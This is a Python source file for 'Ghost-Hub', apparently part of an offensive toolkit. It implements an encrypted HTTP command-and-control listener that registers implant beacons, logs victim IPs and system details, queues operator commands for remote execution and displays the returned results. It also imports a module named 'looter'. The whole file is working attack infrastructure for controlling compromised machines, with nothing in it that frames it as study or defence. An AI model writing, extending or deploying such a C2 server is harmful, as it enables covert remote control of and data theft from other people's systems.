import socket
import threading
import asyncio
import time
import json
import os
import questionary
from aiohttp import web
from cryptography.fernet import Fernet
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from core.ui import draw_header, Q_STYLE
from modules.looter import run_looter

console = Console()


class EncryptedBeaconHub:
    """Next-Generation AES-Encrypted HTTP C2 Listener"""

    def __init__(self, port=8080):
        self.port = port
        self.beacons = {}
        self.tasks = {}
        self.cipher = None
        self.load_key()

    def load_key(self):
        try:
            with open("logs/c2_aes.key", "r") as f:
                key = f.read().strip()
                self.cipher = Fernet(key.encode())
        except Exception:
            console.print(
                "[yellow][!] Warning: No AES key found. Generate an HTTP beacon first![/yellow]")

    async def handle_ping(self, request):
        if not self.cipher:
            return web.Response(status=403)
        try:
            enc_data = await request.text()
            data = json.loads(self.cipher.decrypt(enc_data.encode()).decode())
            agent_id = data.get('id')

            if agent_id not in self.beacons:
                console.print(
                    f"\n[bold green][+] NEW BEACON ACTIVE: {request.remote} (ID: {agent_id})[/bold green]")

            self.beacons[agent_id] = {
                'ip': request.remote,
                'last_seen': time.time(),
                'sysinfo': data.get('sysinfo', 'Unknown')
            }

            if agent_id in self.tasks and self.tasks[agent_id]:
                task = self.tasks[agent_id].pop(0)
                resp = self.cipher.encrypt(json.dumps(
                    {"status": "task", "command": task}).encode()).decode()
                return web.Response(text=resp)

            resp = self.cipher.encrypt(json.dumps(
                {"status": "sleep"}).encode()).decode()
            return web.Response(text=resp)
        except Exception:
            return web.Response(status=500)

    async def handle_result(self, request):
        if not self.cipher:
            return web.Response(status=403)
        try:
            enc_data = await request.text()
            data = json.loads(self.cipher.decrypt(enc_data.encode()).decode())
            agent_id = data.get('id')
            result = data.get('result')
            console.print(
                f"\n[bold cyan]Result from Beacon {agent_id}:[/bold cyan]\n{result}\n[bold red]Ghost-Hub[/bold red]> ", end="")
            return web.Response(text="OK")
        except Exception:
            return web.Response(status=500)

    async def start(self):
        app = web.Application()
        app.router.add_post('/api/v2/ping', self.handle_ping)
        app.router.add_post('/api/v2/result', self.handle_result)
        runner = web.AppRunner(app)
        await runner.setup()
        site = web.TCPSite(runner, '0.0.0.0', self.port)
        await site.start()


async def async_hub_entry():
    draw_header("GHOST-HUB C2 (Encrypted Network)")
    port = await questionary.text("Listen Port (Default 4445 for HTTP):", default="4445", style=Q_STYLE).ask_async()

    http_hub = EncryptedBeaconHub(port=int(port))
    console.print(f"[*] AES-Encrypted Beacon Listener active on Port {port}\n")
    asyncio.create_task(http_hub.start())

    while True:
        if http_hub.beacons:
            table = Table(title="Active GHOST Sessions", border_style="red")
            table.add_column("ID")
            table.add_column("Type")
            table.add_column("IP / SysInfo")
            table.add_column("Last Seen")

            for bid, d in http_hub.beacons.items():
                seen_ago = int(time.time() - d['last_seen'])
                table.add_row(str(bid), "[magenta]Encrypted Beacon[/magenta]",
                              f"{d['ip']} | {d['sysinfo']}", f"{seen_ago}s ago")
            console.print(table)

        cmd = await questionary.text("Hub Command (task <ID> <CMD>, exit):", style=Q_STYLE).ask_async()
        if not cmd:
            continue

        args = cmd.split(maxsplit=2)
        if args[0] == "task":
            if len(args) < 3:
                console.print("[red]Usage: task <Beacon_ID> <command>[/red]")
                continue
            bid, command = args[1], args[2]
            if bid in http_hub.beacons:
                if bid not in http_hub.tasks:
                    http_hub.tasks[bid] = []
                http_hub.tasks[bid].append(command)
                console.print(
                    f"[green][+] Task queued securely for Beacon {bid}.[/green]")
            else:
                console.print("[red]Invalid Beacon ID[/red]")
        elif args[0] == "exit":
            break


def run_ghost_hub():
    try:
        asyncio.run(async_hub_entry())
    except KeyboardInterrupt:
        pass


if __name__ == "__main__":
    run_ghost_hub()
